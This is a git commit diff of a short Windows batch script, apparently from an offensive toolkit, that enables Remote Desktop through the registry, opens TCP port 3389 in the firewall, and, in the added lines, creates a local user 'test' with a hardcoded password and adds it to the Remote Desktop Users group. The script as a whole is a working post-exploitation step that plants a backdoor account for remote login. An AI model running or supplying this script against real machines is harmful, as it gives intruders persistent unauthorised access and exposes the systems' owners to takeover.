7fa722715fa32784dd3e02d6f1d39085c9f51184
赵公子 <zha0gongz1@protonmail.com>
2023-02-23 11:47:23 +0800

    Update open3389.bat

--- Windows/open3389.bat
+++ Windows/open3389.bat
@@ -1,5 +1,7 @@
 @echo off
 :: 命令中/c会将后面参数/q识别为字符串！
 cmd /q /c "REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"
-cmd /q /c "netsh advfirewall firewall add rule name='Remote Desktop' protocol=TCP dir=in localport=3389 action=allow"
+cmd /q /c "netsh firewall add portopening protocol = TCP port = 3389 name = rdp"
+cmd /q /c "net user test Test321!@# /add"
+cmd /q /c "net localgroup "Remote Desktop Users" test /add"
 exit
